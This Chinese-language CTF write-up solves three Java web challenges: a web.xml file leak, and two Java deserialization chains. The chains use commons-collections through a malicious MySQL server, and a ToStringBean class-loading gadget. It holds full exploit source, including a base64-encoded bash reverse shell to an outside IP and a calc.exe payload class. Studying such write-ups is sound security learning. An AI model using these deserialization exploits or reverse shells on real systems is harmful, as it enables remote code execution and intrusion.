# Java

# Java

### ****[RoarCTF 2019]Easy Java****

试着登录一下，并没有注册的选项

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled.png)

下面的help点一下出现了报错`java.io.FileNotFoundException:{help.docx}`

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%201.png)

java的web.xml泄露

post传参fliename=/WEB-INI/web.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <welcome-file-list>
        <welcome-file>Index</welcome-file>
    </welcome-file-list>

    <servlet>
        <servlet-name>IndexController</servlet-name>
        <servlet-class>com.wm.ctf.IndexController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>IndexController</servlet-name>
        <url-pattern>/Index</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>LoginController</servlet-name>
        <servlet-class>com.wm.ctf.LoginController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>LoginController</servlet-name>
        <url-pattern>/Login</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>DownloadController</servlet-name>
        <servlet-class>com.wm.ctf.DownloadController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>DownloadController</servlet-name>
        <url-pattern>/Download</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>

</web-app>
```

直接文件泄露

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%202.png)

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%203.png)

### ****[羊城杯 2020]A Piece Of Java****

代码分析

主要的两个路由/index和/hello，在hello中有对cookie值的反序列化

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%204.png)

加上引入了commons-collections

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%205.png)

遗憾的是相应的是也设置了seriakiller

SerialKiller.conf为配置文件，可以指定白名单，仅仅对白名单中的类反序列化

SerialKiller.java为ObjectInputStream的子类，覆盖了resolveClass方法（此会被readObject（）方法调用），加入了类名检查，确保反序列的是安全的类。

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%206.png)

在InfoInvocationHandler中可以去触发invoke

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%207.png)

checkAllInfo

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%208.png)

checkAllInfo可以触发connect

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%209.png)

将jar包放到jd-gui中

再服务器起一个mysql恶意服务然后将ysoserial的jar包放在下面

[https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)

```java
package gdufs.challenge.web;

import gdufs.challenge.web.invocation.InfoInvocationHandler;
import gdufs.challenge.web.model.DatabaseInfo;
import gdufs.challenge.web.model.Info;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class exp {
    public static void main(String[] args) throws Exception{
        DatabaseInfo databaseInfo = new DatabaseInfo();
        databaseInfo.setHost("49.232.206.37");
        databaseInfo.setPort("4567");//恶意mysql服务端端口
        ///bin/bash -i >& /dev/tcp/vps/7015 0>&1   反弹shell监听的端口
//        databaseInfo.setUsername("yso_URLDNS_http://hud0xf.ceye.io");
        databaseInfo.setUsername("yso_CommonsCollections5_bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ5LjIzMi4yMDYuMzcvMjM0NTYgMD4mMQ==}|{base64,-d}|{bash,-i}");
        databaseInfo.setPassword("123&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");

        //System.out.println(databaseInfo.getUsername());
        Method getUsernameMethod = databaseInfo.getClass().getMethod("getUsername");
        String a =(String) getUsernameMethod.invoke(databaseInfo);
        //System.out.println(a);
//        Class c = Class.forName("gdufs.challenge.web.invocation.InfoInvocationHandler");
        //创建一个InfoInvocationHandler类对象
        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);
        //然后使用动态代理，我们代理的是databaseInfo，所以就要获取其类加载器和接口
        Info info =(Info) Proxy.newProxyInstance(databaseInfo.getClass().getClassLoader(), databaseInfo.getClass().getInterfaces(), infoInvocationHandler);
        //序列化部分，参考MainController.java
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(info);
        oos.close();
        //将序列化结果输出
        //这里的输出语句要注意不要使用System.out.println();
        System.out.printf(new String(Base64.getEncoder().encode(baos.toByteArray())));

    }

}
```

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%2010.png)

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%2011.png)

### ****东华杯2021 ezgadget****

jd-gui分析

User类实现了Serializable接口

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%2012.png)

**IndexController**

两个路由/和/readobject

/readobject会收到data数据data值会在base64解码后

对(name.equals("gadgets")) && (year == 2021)进行判断判断成功后执行readObject()

```java
@Controller
public class IndexController
{
  @ResponseBody
  @RequestMapping({"/"})
  public String index(HttpServletRequest request, HttpServletResponse response)
  {
    return "index";
  }
  
  @ResponseBody
  @RequestMapping({"/readobject"})
  public String unser(@RequestParam(name="data", required=true) String data, Model model)
    throws Exception
  {
    byte[] b = Tools.base64Decode(data);
    InputStream inputStream = new ByteArrayInputStream(b);
    ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
    String name = objectInputStream.readUTF();
    int year = objectInputStream.readInt();
    if ((name.equals("gadgets")) && (year == 2021)) {
      objectInputStream.readObject();
    }
    return "welcome bro.";
  }
}
```

ToStirngBean

继承ClassLoader，并且实现了Serializable接口，有一个ClassByte对象，可以通过toString来将其还原为一个class对象

```java
public class ToStringBean
  extends ClassLoader
  implements Serializable
{
  private byte[] ClassByte;
  
  public String toString()
  {
    ToStringBean toStringBean = new ToStringBean();
    Class clazz = toStringBean.defineClass((String)null, this.ClassByte, 0, this.ClassByte.length);
    Object Obj = null;
    try
    {
      Obj = clazz.newInstance();
    }
    catch (InstantiationException e)
    {
      e.printStackTrace();
    }
    catch (IllegalAccessException e)
    {
      e.printStackTrace();
    }
    return "enjoy it.";
  }
}
```

思路readObject→ToStringBean→toString

exp.java

```java
package com.ezgame.ctf;

import com.ezgame.ctf.tools.ToStringBean;
import com.ezgame.ctf.tools.Tools;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class exp {
    public static void main(String[] args) throws Exception{
        ToStringBean toStringBean = new ToStringBean();
        Field classByteField = toStringBean.getClass().getDeclaredField("ClassByte");
        classByteField.setAccessible(true);
        //获取到shell对象编译后的地址
        byte[] bytes = Files.readAllBytes(Paths.get("G:\\CTF\\2021东华杯\\ezgadget\\exp\\out\\production\\exp\\com\\ezgame\\ctf\\shell.class"));
        //将值传入该对象的成员变量中
        classByteField.set(toStringBean,bytes);
        //到这里，危险函数部分就好了，接下来利用cc5，去调用这个危险函数

        //实例化该类的时候，不能直接像下面这样将参数直接传进行，应该使用反射
        //BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(toStringBean);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(11111);//这个初始值之后会自动会改，所以这里随便整
        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        //反射赋值
        val.set(badAttributeValueExpException,toStringBean);

        //它的readObject方法会去调用成员变量val的toString方法，成员变量val是Object属性的
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        //因为读取参数的时候，会先去读取一个字符串，一个数字，然后才是Object，所以按照顺去output
        objectOutputStream.writeUTF("gadgets");
        objectOutputStream.writeInt(2021);
        //然后才是我们的BadAttributeValueExpException类对象
        objectOutputStream.writeObject(badAttributeValueExpException);

        //base64加密一下
        //转换为字节流
        byte[] bytes1 = byteArrayOutputStream.toByteArray();
        //用该工具类Tools进行base64加密
        String s = Tools.base64Encode(bytes1);
        System.out.println(s);

    }

}
```

shell.java

```java
package com.ezgame.ctf;

import java.io.IOException;
//反弹shell的类
public class shell {
    static {
        try{
            Runtime.getRuntime().exec(new String[]{"calc.exe"});
        } catch (IOException e){
            e.printStackTrace();
        }
    }
}
```

把shell.java构建编译后执行exp.java

一开始/bin/bash没弹还蛮奇怪后来反应过来是windows，就改弹计算器了

![Untitled](Java%204f0ca325aad14fee945ebc69ca658159/Untitled%2013.png)